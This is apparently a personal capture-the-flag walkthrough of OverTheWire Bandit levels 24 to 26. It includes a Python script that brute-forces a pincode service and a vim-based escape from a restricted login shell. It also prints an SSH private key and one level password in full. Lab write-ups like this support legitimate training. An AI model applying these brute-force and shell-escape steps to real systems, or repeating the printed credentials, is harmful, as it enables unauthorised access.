... c o n f i r m a t i o n  d r i l l s ...

[ cat flag.txt | head ]

> I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line,   > separated by a space.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.

[ cat flag.txt | tail ]

> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Correct!
> The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
>
> Exiting.

[ cat flag.txt | grep "Wrong!" | wc -l ]

concatenate | print matching pattern "Wrong!" | WordCount until the Line changes

> 9015

[ echo DC33...R..E..D..A..C..T..E..D... 9015 | nc localhost 30002 ]

... c o n f i r m a t i o n  d r i l l s ...

> I am the pincode checker for user bandit25.
> Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
> Correct!
> The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
>
> Exiting.

DC33...R..E..D..A..C..T..E..D...


## --------------------------------- ALT ---------------------------------


## bandit 24 Python Flava

[ which python3 ]

which - returns the pathnames of the files (or links) which would be executed in the current environment.

> /usr/bin/python3

[ nano pinbrute.py ]

> #!/usr/bin/python3
>
> password = "DC33...R..E..D..A..C..T..E..D..."
> 
> for pin in range (5000,10000):
>   print( password + " " + str(pin))

( nc localhost 30002 kept #Hanging with range 0000, 10000 ... )

[ chmod u+x pinbrute.py ]

> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Wrong! Please enter the correct pincode. Try again.
> Correct!
> The password of user bandit25 is DC33...R..E..D..A..C..T..E..D...
>
> Exiting.

DC33...R..E..D..A..C..T..E..D...




## bandit 25

Level Goal :

Logging in to bandit26 from bandit25 should be fairly easy… 
The shell for user bandit26 is not /bin/bash, but something else. 

Find out what it is, how it works and how to break out of it.


[ ls -la ]

> -rw-r-----  1 bandit25 bandit25   33 Oct  5  2023 .bandit24.password
> -r--------  1 bandit25 bandit25 1679 Oct  5  2023 bandit26.sshkey
> -rw-r--r--  1 root     root      220 Jan  6  2022 .bash_logout
> -rw-r--r--  1 root     root     3771 Jan  6  2022 .bashrc
> -rw-r-----  1 bandit25 bandit25    4 Oct  5  2023 .pin
> -rw-r--r--  1 root     root      807 Jan  6  2022 .profile

[ cat .bandit24.password ]

> DC33...R..E..D..A..C..T..E..D...

[ cat pin ]

> 9015

[ cat bandit26.sshkey ]


-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----


[ ssh -i bandit26.sshkey bandit26@localhost -p2220 ]

> The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
> ED25519 key fingerprint is SHA256:DC33...R..E..D..A..C..T..E..D.../urerLY.

> This key is not known by any other names
> Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

> Could not create directory '/home/bandit25/.ssh' (Permission denied).

> Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

>                      This is an OverTheWire game server. 
>            More information on http://www.overthewire.org/wargames

> !!! You are trying to log into this SSH server with a password on port 2220 from localhost.
> !!! Connecting from localhost is blocked to conserve resources.
> !!! Please log out and log in again.

...

> --[ More information ]--

>  For more information regarding individual wargames, visit
>  http://www.overthewire.org/wargames/

>  For support, questions or comments, contact us on discord or IRC.

>  Enjoy your stay!

>   _                     _ _ _   ___   __  
>  | |                   | (_) | |__ \ / /  
>  | |__   __ _ _ __   __| |_| |_   ) / /_  
>  | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
>  | |_) | (_| | | | | (_| | | |_ / /| (_) |
>  |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
>
> Connection to localhost closed.

[ cat /etc/passwd | grep -e bandit24 -e bandit25 -e bandit26 -e bandit27 -e bandit28 ]

IOT      - Find out which Shell Interperator Bandit26 is Using

grep -e  - Is used to Search for Multiple Patterns ( E/O Before/After ... Git B27 W/O ... )  

> bandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bash
> bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
> bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
> bandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bash
> bandit28:x:11028:11028:bandit level 28:/home/bandit28:/bin/bash
> bandit27-git:x:11527:11527::/home/bandit27-git:/usr/bin/git-shell
> bandit28-git:x:11528:11528::/home/bandit28-git:/usr/bin/git-shell


bandit26:            -  Username
x:                   -  Password ( x = Encrypted and Stored in /etc/shadow , Readable by Root )   
11026:               -  UID ( User ID )
11026:               -  GID ( Group ID )
bandit level 26:     -  UID Info
/home/bandit26:      -  User Home Directory
/usr/bin/showtext    -  Command Shell Interpreter


[ file /bin/bash ]

> /bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
>  dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
> BuildID[sha1]=33a5554034feb2af38e8c75872058883b2988bc5,
> for GNU/Linux 3.2.0, stripped

[ file /usr/bin/showtext ]

> /usr/bin/showtext: POSIX shell script, ASCII text executable

[ cat /usr/bin/showtext ]

> #!/bin/sh
> 
> export TERM=linux
> 
> exec more ~/text.txt
> exit 0

This File excutes AsSoonAs Logging In ...

The Linux String is Stored in the TERM Variable ...

Exec ( Command ) - Replaces Current Process with a New Process ...

Therefore ... more ~/text.txt takes Presidence of the Current Process ...


more - is a FILTER for PAGING THROUGH TEXT one Screenful at a time ( Think of Scrolling ... )

To move forward one page   -  press the spacebar or the "f" key.
To move backward one page  -  press the "b" key.
To move forward one line   -  press the "Enter" key.
To quit more commands      -  press the "q" key.


TERM - The Terminal TYPE used by MORE to get the Terminal Characteristics NECESSARY to Manipulate the Screen .


[ exit ]

[ scp -P 2220 bandit25@bandit.labs.overthewire.org:bandit26.sshkey . ]

> bandit25@bandit.labs.overthewire.org's password: DC33...R..E..D..A..C..T..E..D...

> bandit26.sshkey                                                          100% 1679    27.0KB/s  00:00

[ ( Shrink down own Terminal Window to Enforce More ) ssh -i bandit26.sshkey bandit26@localhost -p2220 ]

E/O bottom left of Terminal ... --More-- (33%) 

[ v ] ( IOT enter Vim Editor ) , [ :e ] ( IOT Exectute ) , [ /etc/bandit\_pass/bandit26 ] ( Prints Flag )

> DC33...R..E..D..A..C..T..E..D...


## --------------- ALT /// Break Out and Into a Bash Shell -------------------


[ v ] ( IOT enter Vim Editor ) , [ :set shell=/bin/bash ] ( Changes Shell via Vim ) , [ :shell ] ( IOT use the Bash Shell ) 


------------- Standardise Terminal back to a Usable Sized Window ------------


[ cat /etc/bandit_pass/bandit26 ]

> DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...

DC33...R..E..D..A..C..T..E..D...


## -------------------------------------------------------------------------------- 
## -------------------------------------------------------------------------------- 
## -------------------------------------------------------------------------------- 

## ---------------------------------      TBC      --------------------------------

## -------------------------------------------------------------------------------- 
## -------------------------------------------------------------------------------- 
## -------------------------------------------------------------------------------- 

## ---------------------------------      B26      --------------------------------

## -------------------------------------------------------------------------------- 
## -------------------------------------------------------------------------------- 
## -------------------------------------------------------------------------------- 

## ---------------------------------      W/O      --------------------------------

## -------------------------------------------------------------------------------- 
## -------------------------------------------------------------------------------- 
## -------------------------------------------------------------------------------- 






















